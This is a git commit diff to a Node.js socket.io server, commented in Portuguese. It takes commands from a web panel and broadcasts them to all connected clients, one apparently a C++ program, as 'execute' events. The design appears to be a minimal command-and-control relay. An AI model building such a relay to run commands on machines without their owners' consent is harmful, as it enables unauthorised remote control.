7f1e03b01dcd2908ad01792b5f2b11ef1d960309
niel <nielbinary@gmail.com>
2026-04-19 01:50:09 -0300

    Update server.js

--- server.js
+++ server.js
@@ -11,23 +11,22 @@ app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
-let clientCount = 0;
-
 io.on('connection', (socket) => {
-    clientCount++;
-    console.log('Novo dispositivo conectado:', socket.id, '| Total:', clientCount);
-    
-    // Avisa o painel quantos hosts tem
-    io.emit('host-count', clientCount);
+    console.log('Novo dispositivo conectado:', socket.id);
 
+    // Quando você clica no botão do site, ele envia 'send-command'
     socket.on('send-command', (data) => {
         console.log('Comando recebido do painel:', data);
+        // Repassa o comando para TODOS os outros conectados (incluindo o C++)
         socket.broadcast.emit('execute', data);
     });
 
     socket.on('disconnect', () => {
-        clientCount--;
-        console.log('Dispositivo desconectado | Total:', clientCount);
-        io.emit('host-count', clientCount);
+        console.log('Dispositivo desconectado');
     });
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`Servidor rodando na porta ${PORT}`);
 });
